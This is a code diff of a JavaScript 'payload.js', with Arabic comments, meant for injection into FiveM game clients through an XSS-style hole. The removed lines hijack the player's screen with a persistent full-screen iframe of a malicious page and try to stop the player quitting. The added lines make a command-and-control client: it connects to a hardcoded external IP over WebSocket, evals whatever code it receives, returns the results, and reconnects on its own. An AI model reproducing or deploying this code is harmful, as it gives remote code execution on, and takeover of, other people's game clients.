@@ -1,47 +1,54 @@
-// ===================================
-// محتوى ملف: payload.js
-// ===================================
+// =========================================================
+// **ملف: payload.js** - (للحقن في FiveM)
+// يجب رفع هذا الملف على GitHub Pages
+// =========================================================
 
-// عنوان URL لملف HTML الذي تريد عرضه (يجب أن يكون على نفس السيرفر)
-const MALICIOUS_HTML_URL = "https://dfjgiufdhgui.github.io/test/index.html"; 
+// **1. قم بتعديل هذا السطر:** استخدم IP العام الخاص بك مع المنفذ 8765
+const WS_SERVER_URL = "ws://5.245.78.85:8765"; 
 
-// معرّف (ID) فريد للإطار لسهولة التحكم به
-const IFRAME_ID = "xss_takeover_iframe"; 
+// 2. دالة بدء الاتصال
+const startConnection = () => {
+  // يمنع فتح اتصالات متعددة بالخطأ
+  if (globalThis.c2Socket && globalThis.c2Socket.readyState === WebSocket.OPEN) {
+    return;
+  }
+  
+  // إنشاء اتصال WebSocket بالخادم
+  const socket = new WebSocket(WS_SERVER_URL);
+  globalThis.c2Socket = socket; 
 
-// دالة لتنفيذ الاستغلال
-function fullScreenTakeover() {
-    // 1. إنشاء عنصر iframe
-    const takeoverFrame = document.createElement('iframe');
+  socket.onopen = () => {
+    console.log("C2 Socket connected successfully. Ready for remote commands.");
+    // يمكنك هنا إرسال أي معلومات تعريفية عن العميل إلى الخادم
+    socket.send(JSON.stringify({ type: 'hello', client: 'FiveM NUI Client' }));
+  };
 
-    // 2. تعيين خصائص تغطية الشاشة بالكامل
-    takeoverFrame.id = IFRAME_ID;
-    takeoverFrame.src = MALICIOUS_HTML_URL;
-    takeoverFrame.style.position = 'fixed';
-    takeoverFrame.style.top = '0';
-    takeoverFrame.style.left = '0';
-    takeoverFrame.style.width = '100%';
-    takeoverFrame.style.height = '100%';
-    takeoverFrame.style.zIndex = '999999'; // لضمان الظهور فوق أي عنصر آخر
-    takeoverFrame.style.border = 'none';
-
-    // 3. إضافة الإطار إلى DOM (جسم الصفحة)
-    document.body.appendChild(takeoverFrame);
-
-    // 4. آلية لمنع الإزالة (Persistence)
-    // هذا الكود يضمن إعادة إنشاء الإطار كل 500 مللي ثانية إذا حاول اللاعب إزالته يدويًا
-    setInterval(() => {
-        if (!document.getElementById(IFRAME_ID)) {
-            document.body.appendChild(takeoverFrame);
-        }
-    }, 500);
-
-    // 5. محاولة إرسال حدث 'ESCAPE' لمنع اللاعب من إغلاق NUI
+  // استقبال الرسائل من خادم Node.js
+  socket.onmessage = ({ data }) => {
     try {
-        window.invokeNative('quit'); // محاولة إرسال أمر الخروج (كما في المقالة)
+        const { type, code } = JSON.parse(data);
+        if (type === 'eval' && code) {
+            // تنفيذ كود JavaScript القادم من واجهة التحكم
+            const returned = eval(code);
+            console.log("Command executed. Result:", returned);
+            // إرسال نتيجة التنفيذ إلى الخادم (اختياري)
+            socket.send(JSON.stringify({ type: 'result', value: `${returned}` }));
+        }
     } catch (e) {
-        console.log("Could not invoke 'quit', proceeding with DOM takeover.");
+        console.error("C2 Eval or Parse Error:", e);
     }
-}
+  };
 
-// تشغيل الدالة فوراً عند تحميل payload.js
-fullScreenTakeover();
+  // عند فقدان الاتصال أو حدوث خطأ، حاول الاتصال مرة أخرى بعد فترة قصيرة
+  const reconnect = () => {
+    globalThis.c2Socket = undefined;
+    setTimeout(startConnection, 1000); // محاولة الاتصال كل ثانية
+    console.log("C2 Socket disconnected. Reconnecting...");
+  };
+  
+  socket.onclose = reconnect; 
+  socket.onerror = reconnect;
+};
+
+// ابدأ عملية الاتصال فور تحميل الملف
+startConnection();
